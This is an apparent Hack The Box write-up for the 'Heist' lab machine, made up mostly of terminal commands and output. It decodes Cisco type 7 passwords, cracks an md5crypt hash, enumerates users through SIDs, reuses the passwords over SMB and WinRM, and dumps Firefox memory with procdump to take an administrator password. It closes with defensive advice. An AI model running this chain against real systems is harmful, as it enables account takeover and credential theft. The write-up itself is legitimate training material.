# Heist

```
root@kali:/home/kali/htb/Heist# nmap -p- -sV -sC 10.129.67.2 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 05:19 EST
Nmap scan report for 10.129.67.2
Host is up (0.027s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-11T10:22:40
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 230.38 seconds
```

The webpage redirects to a login.php page. Where we can login as guest.

This leads to an issues page, where we have a ticket issue from user Hazard with a file upload. So I assume we will be able to upload some reverse shells.

### config.txt
```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh

```

In the attachment we see some creds.

```
root@kali:/home/kali/htb/Heist# wget https://raw.githubusercontent.com/theevilbit/ciscot7/master/ciscot7.py
--2021-03-11 15:27:17--  https://raw.githubusercontent.com/theevilbit/ciscot7/master/ciscot7.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3224 (3.1K) [text/plain]
Saving to: ‘ciscot7.py’

ciscot7.py                             100%[============================================================================>]   3.15K  --.-KB/s    in 0s      

2021-03-11 15:27:17 (99.3 MB/s) - ‘ciscot7.py’ saved [3224/3224]

root@kali:/home/kali/htb/Heist# python ciscot7.py -d -p 0242114B0E143F015F5D1E161713
Decrypted password: $uperP@ssword
root@kali:/home/kali/htb/Heist# python ciscot7.py -d -p 02375012182C1A1D751618034F36415408
Decrypted password: Q4)sJu\Y8qz*A3?d
root@kali:/home/kali/htb/Heist# cat hash
admin:$1$pdQG$o8nrSzsGXeaduXrjlvKc91
root@kali:/home/kali/htb/Heist# john hash -wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (admin)
1g 0:00:00:09 DONE (2021-03-11 15:29) 0.1015g/s 355891p/s 355891c/s 355891C/s stealthy001..ste88dup
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:/home/kali/htb/Heist# 
```

So we have 3 passwords to user Hazed.

$uperP@ssword

Q4)sJu\Y8qz*A3?d

stealth1agent

The login-page requires an email, however. And not just a username.

But the last message is:

```
Hazard
10 minutes ago

 Thanks a lot. Also, please create an account for me on the windows server as I need to access the files. 
```

So we can assume there's an account on the server. I try some smbmap searches:

```
root@kali:/home/kali/htb/Heist# smbmap -H 10.129.67.2 -u "Hazard" -p "$uperP@ssword"
[!] Authentication error on 10.129.67.2
root@kali:/home/kali/htb/Heist# smbmap -H 10.129.67.2 -u "Hazard" -p "stealth1agent"
[+] IP: 10.129.67.2:445 Name: 10.129.67.2                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```


I jump in with rpcclient:

```
root@kali:/home/kali/htb/Heist# rpcclient -U "Hazard" 10.129.67.2
Enter WORKGROUP\Hazard's password: 
rpcclient $> lsaquery
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
rpcclient $> 
```

This is a good time to get some experience with rpc.

```
rpcclient $> lookupnames hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
[...]
[...]
[...]
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1001
S-1-5-21-4254423774-1266059056-3197185112-1001 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1002
S-1-5-21-4254423774-1266059056-3197185112-1002 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1003
S-1-5-21-4254423774-1266059056-3197185112-1003 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1004
S-1-5-21-4254423774-1266059056-3197185112-1004 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1005
S-1-5-21-4254423774-1266059056-3197185112-1005 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1006
S-1-5-21-4254423774-1266059056-3197185112-1006 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1007
S-1-5-21-4254423774-1266059056-3197185112-1007 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1009
S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK\support (1)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1010
S-1-5-21-4254423774-1266059056-3197185112-1010 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1011
S-1-5-21-4254423774-1266059056-3197185112-1011 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1012
S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK\Chase (1)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1013
S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK\Jason (1)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1014
S-1-5-21-4254423774-1266059056-3197185112-1014 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1015
S-1-5-21-4254423774-1266059056-3197185112-1015 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-101
S-1-5-21-4254423774-1266059056-3197185112-101 *unknown*\*unknown* (8)
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1016
S-1-5-21-4254423774-1266059056-3197185112-1016 *unknown*\*unknown* (8)
rpcclient $> 
```

ok, so two new users. Chase and Jason.

I still have two passwords I haven't used.

```
root@kali:/home/kali/htb/Heist# smbmap -H 10.129.67.2 -u "Chase" -p "$uperP@ssword"
[!] Authentication error on 10.129.67.2
root@kali:/home/kali/htb/Heist# smbmap -H 10.129.67.2 -u "Chase" -p "Q4)sJu\Y8qz*A3?d"
[+] IP: 10.129.67.2:445 Name: heist.htb                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
root@kali:/home/kali/htb/Heist# smbmap -H 10.129.67.2 -u "Jason" -p "Q4)sJu\Y8qz*A3?d"
[!] Authentication error on 10.129.67.2
root@kali:/home/kali/htb/Heist# smbmap -H 10.129.67.2 -u "Jason" -p "$uperP@ssword"
[!] Authentication error on 10.129.67.2
root@kali:/home/kali/htb/Heist# 
```

So we have Hazed:stealth1agent and Chase:Q4)sJu\Y8qz*A3?d

but Chase does not have any more privileges.

I decided to go back to the nmap scan, and I googled the ports of the other services. https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management

Shows that port 5985 is the WinRM port. So I google WinRm exploitation. Check a couple of links, and I find https://github.com/Hackplayers/evil-winrm


```
root@kali:/home/kali/htb/Heist# evil-winrm -i 10.129.67.2 -u "Chase" -p "Q4)sJu\Y8qz*A3?d" -s scripts/

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chase\Documents> dir
*Evil-WinRM* PS C:\Users\Chase\Documents> cd ..
*Evil-WinRM* PS C:\Users\Chase> dir


    Directory: C:\Users\Chase


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        4/22/2019   7:14 AM                3D Objects
d-r---        4/22/2019   7:14 AM                Contacts
d-r---        4/22/2019   6:10 PM                Desktop
d-r---        4/22/2019   6:13 PM                Documents
d-r---        2/18/2021   4:03 PM                Downloads
d-r---        4/22/2019   7:14 AM                Favorites
d-r---        4/22/2019   7:14 AM                Links
d-r---        4/22/2019   7:14 AM                Music
d-r---        4/22/2019   7:14 AM                Pictures
d-r---        4/22/2019   7:14 AM                Saved Games
d-r---        4/22/2019   7:14 AM                Searches
d-r---        4/22/2019   7:14 AM                Videos


*Evil-WinRM* PS C:\Users\Chase> menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/ 
              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers  
 
[+] Bypass-4MSI 
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary

*Evil-WinRM* PS C:\Users\Chase> 
```

I look around for a bit. I try to run some powershell scripts like Mimikatz. But nothing.


The only thing I have is the login page on the website. But I don't have access to the wwwroot directory.

```
*Evil-WinRM* PS C:\Users\Chase\Documents> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    472      18     2292       5364               372   0 csrss
    290      13     2256       5156               496   1 csrss
    360      15     3520      14668              4520   1 ctfmon
    254      14     3936      13404              3620   0 dllhost
    166       9     1888       9760       0.03   6980   1 dllhost
    622      33    29796      57340               976   1 dwm
   1484      58    23440      78728              3468   1 explorer
    355      25    16300      38952       0.11   5996   1 firefox
    378      28    25392      62912       0.75   6620   1 firefox
   1057      73   176204     251920       7.41   6644   1 firefox
    345      19    10496      38516       0.08   6756   1 firefox
    401      34    41392      99144       1.78   6908   1 firefox
     49       6     1432       3664               780   0 fontdrvhost
     49       6     1788       4692               788   1 fontdrvhost
      0       0       56          8                 0   0 Idle
    970      23     5796      14792               628   0 lsass
    223      13     2980      10288              4092   0 msdtc
    580      61   109140     135824              2712   0 MsMpEng
      0      12      328      16216                88   0 Registry
    231      12     2744      16452              5644   1 RuntimeBroker
    275      14     2988      15060              5676   1 RuntimeBroker
    301      16     5512      16884              5748   1 RuntimeBroker
    663      32    19468      61692              5532   1 SearchUI
    271      12     2700      11864              5912   0 SecurityHealthService
    547      11     5496      10140               616   0 services
    751      30    18128      59832              5412   1 ShellExperienceHost
    449      17     4892      24148              4860   1 sihost
     53       3      528       1192               272   0 smss
    471      23     5756      16324              2308   0 spoolsv
    286      13     3864      11404                68   0 svchost
    115       7     1252       5308               332   0 svchost
    141       7     1324       5716               364   0 svchost
    311      20     9788      14288               492   0 svchost
    149       9     1724      11724               676   0 svchost
    199      12     2072       9796               704   0 svchost
     85       5      908       3840               740   0 svchost
    855      20     7020      22560               760   0 svchost
    880      16     5356      12112               872   0 svchost
    253      10     2000       7708               928   0 svchost
    374      13    10928      14940              1060   0 svchost
    122      15     3408       7424              1136   0 svchost
    215       9     2100       7536              1176   0 svchost
    184       9     1772       7568              1184   0 svchost
    228      12     2480      11204              1272   0 svchost
    432       9     2724       8872              1300   0 svchost
    156       7     1224       5652              1308   0 svchost
    365      17     4976      14260              1336   0 svchost
    348      14     4632      11880              1384   0 svchost
    169      10     1776       8028              1476   0 svchost
    228      13     3392       8740              1536   0 svchost
    284      10     1904       7960              1544   0 svchost
    321      10     2428       8388              1580   0 svchost
    192      12     2120      12012              1640   0 svchost
    234      11     2436       9824              1764   0 svchost
    161       9     1636       6564              1772   0 svchost
    168      11     2404      13316              1788   0 svchost
    156       8     2112       7384              1812   0 svchost
    403      32     8872      17176              1820   0 svchost
    194      11     1964       8176              1888   0 svchost
    167      11     3880      10680              2352   0 svchost
    230      25     3348      12460              2360   0 svchost
    481      20    13484      28300              2368   0 svchost
    261      13     2616       7932              2392   0 svchost
    383      15    11928      21108              2420   0 svchost
    133       9     1624       6612              2464   0 svchost
    136       8     1512       6164              2500   0 svchost
    126       7     1224       5388              2532   0 svchost
    205      11     2460       8500              2568   0 svchost
    209      12     1848       7476              2600   0 svchost
    231      14     4720      11724              2636   0 svchost
    171       9     1480       7240              2676   0 svchost
    467      16     3276      11752              2816   0 svchost
    262      20     5480      14272              2824   0 svchost
    169      10     2140      13236              2832   0 svchost
    381      24     3344      12288              3232   0 svchost
    126       7     1568       6224              3536   0 svchost
    258      13     3440      12644              3584   0 svchost
    223      11     2816      10908              3792   0 svchost
    165       9     3764      11544              4104   0 svchost
    249      14     3052      13688              4236   0 svchost
    336      18    15052      31732              4424   0 svchost
    229      12     3052      13616              4872   1 svchost
    378      18     6176      28228              4900   1 svchost
    201      15     6156      10156              5008   0 svchost
    211      11     2856      12016              5016   0 svchost
    150       8     1564       7448              5272   0 svchost
    311      16    16104      18064              6120   0 svchost
    124       7     1240       5644              6560   0 svchost
   1903       0      188        148                 4   0 System
    211      21     4104      12892              4956   1 taskhostw
    167      11     2916      10848              2560   0 VGAuthService
    142       8     1700       6864              2552   0 vm3dservice
    136       9     1792       7380              2864   1 vm3dservice
    381      22    10652      22052              2588   0 vmtoolsd
    236      18     5072      15244              6372   1 vmtoolsd
    171      11     1468       6888               480   0 wininit
    282      13     2828      12940               548   1 winlogon
    341      16     9980      19392              3816   0 WmiPrvSE
   1129      32   196416     218676      11.86   2884   0 wsmprovhost


*Evil-WinRM* PS C:\Users\Chase\Documents>
```

Firefox is running. I tried to google a bit on where credentials are stored. I knew that it was somewhere in appdata. But it was troublesome.

I decided to do a procdump instead. 


```
root@kali:/home/kali/htb/Heist# evil-winrm -i 10.129.67.2 -u "Chase" -p "Q4)sJu\Y8qz*A3?d" -s /home/kali/htb/Heist/scripts -e /home/kali/htb/Heist/exes

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Chase\Documents> upload procdump64.exe
Info: Uploading procdump64.exe to C:\Users\Chase\Documents\procdump64.exe

                                                             
Data: 513184 bytes of 513184 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Chase\Documents> ./procdump64.exe -ma 6644 -accepteula

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[04:02:47] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_210312_040247.dmp
[04:02:47] Dump 1 complete: 5 MB written in 0.2 seconds
[04:02:47] Dump count reached.

*Evil-WinRM* PS C:\Users\Chase\Documents> download firefox.exe_210312_040758.dmp
Info: Downloading C:\Users\Chase\Documents\firefox.exe_210312_040758.dmp to firefox.exe_210312_040758.dmp

Progress: 12% : |▒░░░░░░░░░|    

```

Since the download took some time, I decided to run strings on the still downloading file.

```
root@kali:/home/kali/htb/Heist# strings firefox.exe_210312_040758.dmp | grep "password="
"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
            label-password="&fillPasswordMenu.label;"
            accesskey-password="&fillPasswordMenu.accesskey;"
            label-password="&fillPasswordMenu.label;"
            accesskey-password="&fillPasswordMenu.accesskey;"
root@kali:/home/kali/htb/Heist# 
```

And we get a GET request with credentials.


I try logging into the webpage, but I'm just redirected back to the issues.php page.

So Let's try the credentials on the machine.

```
root@kali:/home/kali/htb/Heist# evil-winrm -i 10.129.67.2 -u "administrator" -p '4dD!5}x/re8]FBuZ' -s /home/kali/htb/Heist/scripts -e /home/kali/htb/Heist/exes

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
supportdesk\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Notice that I had to surround the password with single quotes instead of double quotes.



## Comparing myself to the offical writeup:

They crack the passwords found on the guest login with john. And then use crackmapexec to bruteforce what password fits with user hazard.

They try to use crackmapexec winrm to login. But the login fails, as hazard is not in the correct group. But they can use RID bruteforce to get the SIDs of the users or services on a window host.

They use cme smb with the --rid-brute flag. And they get the other usernames.

And again use cme smb to brute force the usernames and passwords. And use evil-winrm to login

they enumerate the processes and see that firefox is running. Use procdump to get the memory contents and then start an smbserver locally to transfer the file.

they then search the dump with strings and find the creds.



## How to stop this exploit:

User Hazard should not have shared even obfuscated passwords in his log, and the supportdesk should not have any tickets available for public view as a guest.

Reusing passwords is also an issue here. As we were able to get access to both hazard and Chase with passwords used on a router config.

I do not know if the target machine needed to have firefox running. But they could possibly remove access of user Chase to the processes.

